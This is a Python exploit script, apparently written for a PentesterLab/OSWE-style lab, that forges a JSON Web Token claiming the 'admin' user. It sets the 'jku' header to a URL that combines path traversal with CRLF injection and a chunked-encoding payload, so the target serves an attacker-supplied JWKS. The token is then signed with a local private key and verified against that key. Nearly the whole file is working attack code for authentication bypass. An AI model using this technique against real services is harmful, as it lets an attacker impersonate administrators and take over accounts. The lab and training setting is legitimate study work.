# JKU with a fixed/hardcoded public/private key pair
# I.e. assumes we already have a key pair with the JWK previously published 

import jwt
import json
from codecs import encode, decode
import requests
import struct
import hashlib
import hmac
import base64
import cryptography.hazmat.primitives.asymmetric.rsa as rsa
import cryptography.hazmat.primitives as primitives
import cryptography.hazmat.primitives.hashes as hashes
import cryptography.hazmat.primitives.asymmetric.padding as padding
import cryptography.hazmat.primitives.serialization as serialization

print("----- PARAMS -----")
# jku_url = "http://example.com/.well-known/../redirect?redirect_uri=https://raw.githubusercontent.com/hobietje/oswe/master/automation/jwt/data/jku-2.json"
jku_url = "http://ptl-b77a8d98-ad25e3bd.libcurl.so/.well-known/../debug?value=%0d%0aTransfer-Encoding:+chunked%0d%0a%0d%0a104%0d%0a%7b%22%6b%65%79%73%22%3a%5b%7b%22%6b%74%79%22%3a%22%52%53%41%22%2c%22%61%6c%67%22%3a%22%52%53%32%35%36%22%2c%22%6b%69%64%22%3a%22%70%65%6e%74%65%73%74%65%72%6c%61%62%22%2c%22%75%73%65%22%3a%22%73%69%67%22%2c%22%6e%22%3a%22%77%38%63%41%79%59%47%54%68%35%75%49%79%75%32%52%48%67%4a%6d%62%33%4e%4f%76%30%6a%78%7a%50%62%48%43%4f%32%36%39%76%50%56%35%2d%75%47%33%65%4b%58%64%33%71%4e%4c%45%55%63%41%4d%5a%7a%4f%57%34%53%6b%34%37%49%49%52%39%54%73%55%31%77%63%74%62%46%4b%66%37%56%75%6a%41%52%66%4d%4a%71%4d%76%31%62%74%39%64%6d%56%33%72%54%44%4e%53%64%34%2d%49%77%52%5f%54%4f%4b%7a%56%46%2d%38%71%69%53%6d%6b%6d%67%50%54%2d%34%52%47%62%4a%45%53%4a%50%4c%46%42%32%61%54%55%43%6e%78%32%35%67%54%30%74%73%7a%33%5f%74%59%62%48%65%2d%48%5f%34%45%22%2c%22%65%22%3a%22%41%51%41%42%22%7d%5d%7d%0d%0a0%0d%0a"
print(jku_url)
private_pem = open("data/rsa.private", "rb").read()
print(private_pem)
private_key = serialization.load_pem_private_key(
    private_pem,
    password=None,
)
print(private_key)

print("----- ENCODE -----")
# create an appropriate JSON object for header
header_str = '{"typ":"JWT","alg":"RS256","kid":"pentesterlab","jku":"' + jku_url + '"}'
header_data = json.loads(header_str)
print(header_data)
header_b = header_str.encode()
header_b64 = base64.urlsafe_b64encode(header_b).rstrip(b"=")

# create an appropriate JSON object for payload
# payload_str = '"admin"'
payload_str = '{"user":"admin"}'
payload_data = json.loads(payload_str)
print(payload_data)
payload_b = payload_str.encode()
payload_b64 = base64.urlsafe_b64encode(payload_b).rstrip(b"=")

# JWS Signing Input == ASCII(BASE64URL(UTF8(JWS Protected Header)) || '.' || BASE64URL(JWS Payload))
sig_b = private_key.sign(
    header_b64 + b'.' + payload_b64,
    padding.PKCS1v15(), # PKCS1v15 aka PKCS1 is equivalent to RS256 (RSA_PKCS1_PADDING)
    hashes.SHA256()
)
sig = base64.urlsafe_b64encode(sig_b).rstrip(b"=")

# print the json token
encoded = '{}.{}.{}'.format(header_b64.decode(), payload_b64.decode(), sig.decode())
print(encoded)

print("----- VERIFY -----")
header = jwt.get_unverified_header(encoded)
print(header)

payload = jwt.decode(encoded, options={"verify_signature": False})
print(payload)

jwks_client = jwt.PyJWKClient(jku_url)
signing_key = jwks_client.get_signing_key_from_jwt(encoded)
payload = jwt.decode(encoded, signing_key.key, algorithms=["RS256"])
print(payload)
